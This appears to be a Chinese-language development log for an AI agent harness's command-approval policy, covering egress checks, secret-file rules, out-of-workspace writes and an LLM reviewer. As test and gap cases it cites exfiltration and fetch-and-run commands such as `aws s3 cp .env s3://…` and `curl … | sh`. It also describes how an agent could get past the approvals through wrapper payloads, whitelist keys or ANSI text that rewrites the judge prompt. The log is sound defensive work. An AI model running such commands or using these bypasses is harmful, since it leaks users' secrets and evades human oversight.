  `is_secret_path` 对 `.env.example` / `.env.sample` 等公开模板显式放行。
  `CheckpointManager` 改为调用同一个函数，名单只剩一处。
- 顺带修 `_opaque_payload` 的标志位解析：`--data=@file` 这类 `=` 形式先取名字再比对。

## 踩过的坑

- 出口判定一开始排在 opaque 前面，`curl … | sh` 的 code 从 `opaque_command` 变成
  `network_egress`，既有用例立即失败：标签顺序也是语义。
- `-X`（方法）与 `-x`（curl 代理）大小写折叠后同名。选择从严：代理写法多问一次，
  好过 DELETE 拿到 GET 的免审键。
- 裸主机名的「目标」只能靠猜。猜一个 `nc:host` 的键等于把免审范围放大到任意主机，
  所以宁可每次问。
- IPv6 目标解析一开始把 `[::1]:21` 切成 `::1]:21`，先处理括号再切端口。
- 改完逐段归类后，长命令摘要的旧断言失败了：摘要中间的「… 中间省略 …」独占一行，
  被当成第三个命令段。这不是 bug，而是「没看全的命令不预授权」的自然结果；
  把断言和文档都改成这条不变式。

## 测试

`test_exec_policy.py` 新增出口矩阵（GET/HEAD/上传/改方法/多主机/IPv6/userinfo/
管道/full-access/never）、复合命令同类一致性与秘密模板；`test_approval_scope.py`
验证会话批准的主机粒度与复合命令不记第一段；`test_checkpoints.py` 验证快照层与
策略层共用名单。全量 656 passed。

## 收获

- **出口是读放开后的另一半边界**：文件路径只回答「能不能拿」，出口回答「拿出去算不算」。
  只做前者，等于给外传留了一条不需要绕过的正门。
- **免审键必须窄于被批准的那一次动作**：按钮写「允许同类」，同类就要能从命令本身唯一
  推出；推出两个答案时，正确做法是不给键。
- **名单与例外只能有一份**：两处各自解释，迟早一处放行一处拒绝；统一到一个函数，
  顺带让测试能直接覆盖生产名单。
- **截断也是「没看全」**：审批面省略了内容，就不该再提供整类预授权；安全上的保守
  与展示上的省略应当互相一致。

---

## 问题：审查官的批量路径与单条路径不是同一套判定

两条路径各写一份 prompt，差异不在文风而在防御：单条有 `JUDGE_DETAIL_BUDGET` 超预算升级、
`_judge_facts` 事实段、控制字符转义和 `HARNESS_JUDGE_MODEL`；批量只把裸命令拼成
`[0] cmd`。同一条命令单审有事实、批判没事实；带 ANSI 的命令还能借批量改写提示词。
熔断也只接了一半：`judge_broken` 只在 `preflight_judge` 里被判，`enforce` 的单条闸门
不查，停用之后交互式每条 ASK 仍会白等一次 30s 超时。

同轮核出的名单洞（实测 workspace-write / on-request）：`aws s3 cp .env s3://b/k`、
`rclone copy .env remote:b`、`gcloud … delete`、`pip install`、`npx`、`Start-Process`
全部 ALLOW；`nohup`/`xargs` 虽然 ASK，但同类键记在包装器上，批一次等于开放整类。

## 做法

- `_judge_payload()` 成为唯一的 payload 构造器：触发原因、事实段、转义后的 detail 只写
  一处，批量按条复用；超预算的候选跳过，留给单条路径升级人工，不在半条命令上盲批。
- `_judge_model()` 统一 `HARNESS_JUDGE_MODEL` 回退；批量统计部分放行也记一次 `escalated`。
- 熔断判断移进 `_judge_auto_approve` 的缓存未命中分支：缓存命中仍放行，新判定直接转人工。
- `EXTERNAL_OPERATIONS` 收云 CLI 与包管理器，`_NO_SESSION_GRANT` 由它和启动器名单合并；
  前缀包装器逐段逐层剥开再判定，同类键落在内层命令上（`nohup rm -rf build` → `rm`）；
  `_strip_wrappers_in_segments` 同时服务策略判定、`bash -c` 的载荷递归和同类键，
  三处共用一份规则。
- `secret_references()` 按文件名扫 bash 的 token；命中且命令里有出口/外部操作时升级为
  `secret_egress`。不做路径解析、不硬拒：`grep .env docs` 这类正常文本用法误伤面比
  文件工具大，要不要拦由人看完整条命令决定。
- 飞书侧补审查官放行通知：`recent_permissions()` 读 `/v1/permissions` 的 `recent`，按
  会话归属推一条不带按钮的提示；只推网关启动之后产生的请求（重启不补历史），去重集合
  与 pending 的通知集合分开——后者每轮按 pending 收敛，混用会重复通知。

## 测试

`test_exec_policy.py` 新增云 CLI/包管理器/启动器矩阵、包装器判定与同类键、秘密外发；
`test_approval_judge.py` 新增批量 payload 与单条同源、超预算候选不进批量，并把熔断用例
补到「单条路径也不得再调 LLM」。

## 收获

- **两条路径的防御必须同源**：复制一份 prompt 就是复制一份遗漏，差异迟早出现在最危险
  的那条路上。
- **熔断是状态，不是参数**：只在批量入口查一次，等于给单条路径留了每次 30s 的后门。
- **同类键要落在真正执行的动作上**：包装器不是动作，按它记账买的是整类命令。
- **秘密检查要看数据流向**：本地读放开是既定策略，外发才是要人看一眼的那一步。
- **「少问」要配「知道被少问了什么」**：自动放行不占审批面，就必须在同一个界面留痕，
  否则用户只会看到工具悄悄执行了。
- **剥包装器必须按段**：只剥整条命令的开头时，`true; nohup aws s3 cp .env …` 是 ALLOW，
  而同类键却按段算——判定比免审键更松，边界就落在松的那一侧。判定、`bash -c` 载荷递归
  和同类键必须共用同一份剥离规则。

---

## 问题：bash 的越界写在 workspace-write 档一次都不问

文件工具早就按路径分区：工作区内写免审，工作区外、系统目录要审批，秘密文件硬拒。
bash 却没有这一步——`cp a.txt C:/Users/someone/x.txt`、`echo hi > C:/Windows/x.txt`
在 workspace-write 档全部 ALLOW。默认档的名字叫「工作区写」，实际上只约束了文件工具，
约束不到命令；而模型完全可以用 `cp`/`tee`/`dd` 绕过一次文件工具审批。

补第一版时又核出两个同类缺口：shell 包装器载荷（`bash -c 'cp a C:/x'`、
`cmd /c "copy a C:\x"`）外层动词不是写命令，扫描看不见里面的写目标；以及会话白名单
排在审批之前——批准一次工作区内的 `cp a b` 并勾选「本会话允许同类」后，`cp .env
C:/…` 会凭同一个 `bash:cp` 键直接放行，新加的越界写检查被原地旁路。

## 做法

- `FILE_WRITE_COMMANDS`（`cp`/`mv`/`tee`/`dd`/`tar`/`unzip`/`mkdir`/`install`/PowerShell
  的 `*-Item` 等）与重定向目标共同构成写目标；`_write_targets()` 同时认 `> x`、`2> x`、
  `of=C:/x`、`--output=C:/x` 几种写法。
- `_looks_pathish()` 只认显式指向某处的路径：盘符、UNC、`~`、含 `..` 的段，或带两段的
  POSIX 绝对路径。单段 `/x` 不认——`cmd /c`、`xcopy /s` 的开关就长这样，误认会让包装器
  命令白白丢掉同类键。相对路径按 cwd 解析后本来就在工作区内，不单独升级。
- `_outside_write_targets()` 用 `classify_path()` 判分区，与文件工具同一套工作区/秘密/
  系统目录规则；`_all_write_targets()` 下钻 `bash -c`/`cmd /c` 载荷（有段数预算），
  前缀包装器仍由 `_strip_wrappers_in_segments()` 逐段剥。
- `Policy.evaluate()` 在 workspace-write 档多一步 §7：命中越界写目标 → ASK
  `outside_workspace_write`；读命令（`cat`/`find`/`ls`…）不在写名单里，读照旧放开。
  工作区由 `hooks.evaluate_call()` 传入 `get_workdir()`；漏传时退回进程 cwd，是退化不是放行。
- 同类键收紧：带写目标的段返回 `None`（`_bash_segment_class`），「本会话允许同类」按钮
  不出现、也不写键。第一版写成「任何显式路径都没有同类键」，结果把 `rm -rf /tmp/a`
  （测试明确要求键是 `rm`）和绝对路径调用 `C:\Windows\System32\cmd.exe /c del x`
  （键应为 `del`）一起误伤——路径出现在参数/动词位置，和「写目标」不是一回事。

## 踩过的坑

- **开关与 POSIX 绝对路径同形**：`/c`、`/s` 看起来就是绝对路径；判定必须要求
  `/a/b` 这种两段形式，否则 `cmd /c`、`xcopy /s` 全部丢掉同类键。
- **判定必须和免审键同源**：越界写扫描只扫外层段时，`bash -c 'cp a C:/x'` 是 ALLOW；
  而同类键又会把整个 `cp` 类放进白名单。两处都必须看穿包装器载荷。
- **新 ASK 类别要先问「白名单能不能绕过它」**：`enforce` 的会话白名单在审批之前，
  任何新加的询问条件如果不收紧同类键，都只是给「批一次同类」多送一个可绕过的分支。
- **文本分析的边界要写进文档**：引号不做语法解析，含空格的路径只取到前半截；藏在解释器
  字符串、变量展开、命令替换里的路径看不到。真边界仍是 OS 沙箱，这一层只负责「命令里
  明写的目标」。

## 测试

`test_exec_policy.py` 新增越界写矩阵（`cp`/`mv`/`tee`/`dd`/`unzip`/`install`/重定向/
`nohup`/`bash -c`/`cmd /c`）、读与工作区内写放行矩阵、三档行为，以及「带写目标的段
没有同类键」；`test_execution_paths.py` 钉住 hooks 传给策略层的是 harness 工作区；
`test_approval_scope.py` 验证一次工作区内 `cp` 的会话批准不覆盖越界写。

## 收获

- **档位的名字要对得上实际约束**：叫 workspace-write 就不能只约束一半工具。
- **新增询问点的同时检查预授权**：否则询问是新的，绕过的老路还通着。
- **启发式规则要窄**：只抑制真正危险的键（写目标），别把「出现过路径」当成「可能越界」；
  前者误伤面小，后者会把正常的绝对路径调用也变成每次都问。



1. **每个 tool_call 都必须有 tool 结果**——阻断 ≠ 跳过，阻断也要返回一条 tool 消息。
2. **安全是分层防御**——黑名单 + 询问 + 拒绝记忆 + 提示词，单靠一层永远不够。
3. **压缩分四级成本**——0 API → 1 API → 出错才触发，阈值顺序决定是否死代码。
4. **校验器必须双向**——dangling 和 orphan 都是硬错误，缺一边测试就是漏网之鱼。
5. **模型是系统边界**——参数兜底、命令靠提示词约束、输出靠解析兜底。
6. **真机跑一遍顶十轮测试**——mock 全绿 ≠ 线上不崩，端到端验证产物用后即清。
7. **推理模型是"会思考"的边界**——max_tokens 要给思考链留预算，content 可能为空必须兜底。
8. **Windows 编码是隐形杀手**——读写显式 UTF-8，提示词规避 Get-Content，图标字符慎用。
9. **异步能力靠锁与保活兜底**——daemon 线程进程退出即消亡，"到点执行"必须进程保活；并发互斥用非阻塞抢锁 + 双重检查 + finally 释放（推/拉没有绝对优劣，按场景分工）。
10. **模块拆分后全局搜被移走的引用**——run_bash 移到 tools.py 后，agent_teams 还在调 `harness.run_bash` → AttributeError 静默废掉 teammate 的 bash。搬代码 ≠ 改完，直接引用要全查。
11. **"公平分工"是协调问题不是并发问题**——轮询认领无协调必然偏斜（相位领先者通吃）；多 agent 协作要显式分配或加抖动。
12. **改返回值语义必须同步所有调用点**——返回码从布尔改字符串后，调用方真值判断把 'awake' 当成 shutdown，teammate 收到计划批准反而退出。
13. **隔离优于约束**——与其提示模型"别写错目录"，不如用 git worktree 在物理上隔离；会话级可变状态（当前 cwd）必须显式跟踪完整生命周期，否则泄漏到下一个任务。
14. **判定只能有一处**——同一套黑名单写三遍，实际边界就是最弱的那条路径；策略层收敛后，档位、审批分级、凭据都只需要解释一次，四条执行入口的行为才可验证。
15. **"不问"不等于"允许"**——没有 OS 沙箱兜底时，`never` 必须 fail-closed；把"不打断"实现成"静默放行"，等于关掉最后一道闸。
16. **审批只接受意图，不接受结论**——同类判定键、白名单范围这类"结论"要由服务端从被审批的内容推出；让客户端传 `klass` 等于让审批人自己划免审边界。同理，运行时扩充进来的第三方工具默认询问：不认识 ≠ 没有副作用。
17. **审批要看得见、且按会话算数**——命令摘要留头尾（截掉的往往就是危险的后半句）、控制字符转义（别让被审批的字符串改写审批界面）、会话 id 与凭据一样显式跨线程带走（ContextVar 不随线程继承，漏带就退回进程级白名单）、`untrusted` 档不走白名单短路，同类键解开 `cmd /c` 这类包装器。
18. **免审粒度不宽于按钮的含义**——按程序名记「同类」，批一次 `ssh host rm x` 就开放了整会话的任意远程命令；解释器/远程执行/容器/Git 写子命令要么按子命令收，要么干脆不给免审出路。同理，安全档位不能存在被约束者可写的位置（工作区内的 `.env`），状态变更要配撤销口（`/revoke`、换档作废旧预授权）。
19. **读放开要把边界移到写和出口**——读任意文件本身不新增能力（bash 早就能读），真正的风险是「读得到 + 发得出去」。所以文件工具的硬拒改成「读放行、越界写审批、秘密文件拒绝」，同时明确下一步必须把外发审批接上；同一路径必须由同一个解析函数判定，否则策略批的和工具写的可能不是同一个地方。
20. **只读工具也是读**——grep / ls / glob 必须继承 read 的路径分区与秘密过滤；grep 在打开文件之前跳过秘密目标，否则 read 的硬拒只是一扇没关的侧门。
21. **审批归属必须先于审批决议**——消息入口要校验来源（只收单聊）、进程入口要校验身份（白名单缺失即拒启）、请求要按登记会话路由到唯一聊天；拿到 req_id 不等于有权决议，按钮和文本命令都必须回到「这条请求是否推给当前聊天」。
22. **免审键要窄于被批准的动作**——外发请求只给 curl/wget 的普通读请求记 `命令:主机`，改方法/带请求体/多目标/裸主机名都不记；复合命令每段同类一致才记，否则批准 `ls && rm x` 会留下一个 `bash:ls` 的万能键。GET 也要审批：读放开后，出口边界问的是「东西能不能出去」，不是「这个请求危不危险」；摘要截断的命令同样不预授权。
